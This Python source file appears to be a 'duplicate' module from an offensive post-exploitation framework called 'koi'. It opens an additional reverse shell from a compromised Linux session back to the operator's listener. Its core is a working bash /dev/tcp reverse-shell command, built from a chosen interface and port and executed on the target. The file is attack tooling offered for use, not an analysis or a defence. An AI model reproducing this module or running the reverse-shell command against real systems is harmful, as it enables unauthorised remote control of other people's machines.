from __future__ import annotations

from koi.modules.blueprint import KoiModule
from koi.utils.config import CONFIG, TIMEOUTS
from koi.utils.payloads import get_interfaces
from koi.utils.ui import yesno


class DuplicateModule(KoiModule):
    name        = "duplicate"
    description = "Create a new reverse shell from this session back to the listener"
    category    = "Session"
    platform    = "linux"
    usage       = "duplicate <id> [-i IFACE] [-p PORT]"
    arguments   = [
        {"flags": ["-i", "--iface"], "default": None, "metavar": "IFACE",
         "help": "Network interface to use (default: wlan0 with confirmation)"},
        {"flags": ["-p", "--port"], "type": int, "default": CONFIG["port"], "metavar": "PORT",
         "help": f"Listener port (default: {CONFIG['port']})"},
    ]

    def run(self) -> None:
        ifaces = get_interfaces()

        if not ifaces:
            self.err("No network interfaces found. Make sure 'ip' command is available on the target.")
            return

        iface_arg = getattr(self.args, "iface", None)
        port_arg = getattr(self.args, "port", CONFIG["port"])

        if iface_arg:
            if iface_arg not in ifaces:
                self.err(f"Interface '{iface_arg}' not found. Available: {', '.join(ifaces.keys())}")
                return
            iface = iface_arg
        else:
            default_iface = "wlan0" if "wlan0" in ifaces else next(iter(ifaces))
            try:
                if not yesno(f"No interface specified, use '{default_iface}'?", prechosen=False):
                    self.status("Cancelled.")
                    return
            except KeyboardInterrupt:
                self.status("Cancelled.")
                return
            iface = default_iface

        lhost = ifaces[iface]
        lport = port_arg

        with self.spinner(f"Spawning reverse shell to {lhost}:{lport}..."):
            cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &"
            result = self.exec(cmd, timeout=TIMEOUTS["exec_command"])

        if result.returncode == 0:
            self.success(f"Reverse shell spawned to {lhost}:{lport}")
            self.ok(f"New session should appear shortly on the listener.")
        else:
            self.warn(f"Command exit code: {result.returncode}")
            if result.stdout:
                self.status(f"Output: {result.stdout}")
